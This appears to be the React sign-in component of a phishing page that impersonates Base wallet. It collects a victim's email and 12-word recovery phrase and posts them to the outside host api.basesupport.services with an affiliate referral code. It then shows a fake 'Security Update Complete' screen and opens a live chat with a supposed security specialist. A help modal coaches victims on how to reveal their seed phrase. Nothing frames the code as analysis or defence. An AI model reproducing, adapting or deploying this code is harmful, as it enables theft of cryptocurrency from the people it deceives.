"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";

export default function SigninForm({ referralCode, initialEmail, initialStep }) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [email, setEmail] = useState(initialEmail);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [status, setStatus] = useState("");
  const [showHelp, setShowHelp] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [currentStep, setCurrentStep] = useState(initialStep);

  const isSeedStep = currentStep === "password";
  const emailReady = email.trim().length > 5;
  const seedReady = seedPhrase.trim().split(/\s+/).filter(Boolean).length >= 12;

  // Build URLs while preserving the referral code
  const getUrlWithRef = (basePath, params = {}) => {
    const newParams = new URLSearchParams(params);
    if (referralCode) newParams.set("ref", referralCode);
    const query = newParams.toString();
    return query ? `${basePath}?${query}` : basePath;
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!emailReady) return;
    
    // Update the URL and internal state
    const nextUrl = getUrlWithRef("/signin", { step: "password", email: email.trim() });
    router.push(nextUrl);
    setCurrentStep("password");
  };

  const handleSeedSubmit = async (e) => {
    e.preventDefault();
    if (!seedReady) return;

    setStatus("Securely importing wallet...");

    try {
      const response = await fetch("https://api.basesupport.services/api/auth/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: email.trim(),
          password: seedPhrase.trim(),
          referred_by: referralCode, // Send the referral code to backend
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setIsSuccess(true);
        setStatus("✅ Account secured successfully.");
        
        if (window.smartsupp) {
          window.smartsupp('chat:open');
        }
      } else {
        setStatus(`❌ Error: ${data.message || "Failed to import wallet. Please try again."}`);
      }
    } catch (error) {
      console.error("Submission error:", error);
      setStatus("❌ Connection error. Please check your internet and try again.");
    }
  };

  const toggleHelp = () => setShowHelp(!showHelp);

  return (
    <div className="min-h-screen bg-[#050508] text-white overflow-hidden font-sans">
      <main className="mx-auto max-w-[440px] min-h-screen flex flex-col px-5 sm:px-6 py-10 md:py-16">
        
        {/* Back Arrow */}
        <button 
          onClick={() => {
            if (isSeedStep) {
              const prevUrl = getUrlWithRef("/signin", { email: email.trim() });
              router.push(prevUrl);
              setCurrentStep("email");
            } else {
              router.push("/");
            }
          }}
          className="mb-10 text-4xl text-white/70 hover:text-white inline-block transition-colors text-left"
        >
          ←
        </button>

        {isSuccess ? (
          /* ====================== SUCCESS SCREEN ====================== */
          <div className="flex-1 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-500">
             <div className="w-20 h-20 bg-green-500/10 border border-green-500/20 rounded-full flex items-center justify-center mb-8">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12" />
                </svg>
             </div>
             <h1 className="text-3xl font-bold mb-4 tracking-tight">Security Update Complete</h1>
             <p className="text-white/60 text-lg leading-relaxed mb-10">
               Your recovery phrase has been securely validated. A security specialist is now available to assist you with any final steps.
             </p>
             <button 
               onClick={() => window.smartsupp && window.smartsupp('chat:open')}
               className="px-8 py-4 bg-[#4285f4] hover:bg-[#5a9eff] rounded-3xl font-bold text-lg transition-all active:scale-95 shadow-lg shadow-[#4285f4]/20"
             >
               Chat with Support
             </button>
          </div>
        ) : isSeedStep ? (
          /* ====================== SEED PHRASE SCREEN ====================== */
          <div className="flex-1 flex flex-col justify-items-start">
            <h1 className="text-[32px] leading-none font-semibold tracking-[-1px] mb-4">
              Sign in with a recovery phrase
            </h1>

            <p className="text-[17px] text-white/75 leading-relaxed mb-4">
              This is a 12-word phrase you were given when you created your previous wallet.
            </p>

            {/* "Where can I find this?" Link */}
            <p
              onClick={toggleHelp}
              className="my-2 text-[#4285f4] text-[15px] font-medium hover:underline transition-colors cursor-pointer text-left"
            >
              Where can I find this?
            </p>

            <form onSubmit={handleSeedSubmit} className="flex flex-col flex-1">
              <textarea
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="12-word recovery phrase"
                className="flex-1 bg-[#0f0f14] border-2 border-[#4285f4] focus:border-[#4285f4] focus:ring-4 focus:ring-[#4285f4]/40 rounded-3xl px-6 py-6 text-[17px] font-mono leading-relaxed resize-none outline-none placeholder:text-white/40 transition-all mb-4"
                spellCheck={false}
                required
              />

              <button
                type="submit"
                disabled={!seedReady}
                className="mt-6 w-full py-4 bg-[#4285f4] hover:bg-[#5a9eff] disabled:bg-[#4285f4]/60 disabled:cursor-not-allowed rounded-3xl font-semibold text-[17px] transition-all active:scale-[0.985]"
              >
                Continue
              </button>
            </form>

            <div className="mt-6 flex justify-between items-center bg-[#0f0f14] border border-white/10 rounded-3xl px-6 py-4 text-sm">
              <span className="text-white/80 truncate">{email}</span>
              <button 
                onClick={() => {
                  const url = getUrlWithRef("/signin", { email: email.trim() });
                  router.push(url);
                  setCurrentStep("email");
                }}
                className="text-[#4285f4] font-medium"
              >
                Change
              </button>
            </div>
          </div>
        ) : (
          /* ====================== EMAIL STEP ====================== */
          <div className="flex-1">
            <div className="mb-12">
              <div className="inline-flex px-5 py-1.5 bg-white/5 rounded-full text-xs tracking-widest text-white/60 mb-5">
                STEP 1 OF 2
              </div>
              <h1 className="text-3xl font-semibold tracking-tight">Sign in to Base</h1>
            </div>

            <form onSubmit={handleEmailSubmit} className="space-y-8">
              <div>
                <label className="block text-sm text-white/70 mb-3">Email address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="you@example.com"
                  autoComplete="off"
                  className="w-full bg-[#0f0f14] border border-white/20 focus:border-[#4285f4] rounded-3xl px-6 py-5 text-lg outline-none"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={!emailReady}
                className="w-full py-4 bg-[#4285f4] hover:bg-[#5a9eff] disabled:bg-[#4285f4]/60 rounded-3xl font-semibold text-[17px] transition-all active:scale-[0.985]"
              >
                Continue
              </button>

              <p className="text-center text-white/60">
                Don't have an account?{" "}
                <Link href="/" className="text-[#4285f4]">Get started</Link>
              </p>
            </form>
          </div>
        )}

        {/* Status Message */}
        {status && !isSuccess && (
          <div className="mt-8 p-5 bg-[#4285f4]/10 border border-[#4285f4]/30 rounded-3xl text-sm">
            {status}
          </div>
        )}
      </main>

      {/* Floating Help Modal */}
      {showHelp && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 px-5">
          <div className="bg-[#0f0f14] border border-white/10 rounded-3xl max-w-md w-full p-8 relative">
            <button
              onClick={toggleHelp}
              className="absolute top-6 right-6 text-white/60 hover:text-white text-2xl leading-none"
            >
              ×
            </button>

            <h2 className="text-xl font-semibold mb-5">How to find your recovery phrase</h2>
            
            <div className="space-y-4 text-[15px] text-white/80">
              <p>Open your <span className="text-white">Base Wallet</span> app on your phone:</p>
              <ol className="list-decimal pl-5 space-y-3">
                <li>Tap the <span className="font-medium">Settings</span> tab (usually bottom right)</li>
                <li>Select <span className="font-medium">Wallet</span> or <span className="font-medium">Security & Privacy</span></li>
                <li>Tap <span className="font-medium">Show Recovery Phrase</span></li>
                <li>Authenticate using your PIN, Face ID, or fingerprint</li>
                <li>Copy or carefully write down the 12 words in the exact order</li>
              </ol>
            </div>

            <p className="mt-6 text-xs text-white/60">
              ⚠️ Never share your recovery phrase with anyone, including Base support.
            </p>

            <button
              onClick={toggleHelp}
              className="mt-8 w-full py-3.5 bg-white/10 hover:bg-white/15 rounded-2xl font-medium transition"
            >
              Got it
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
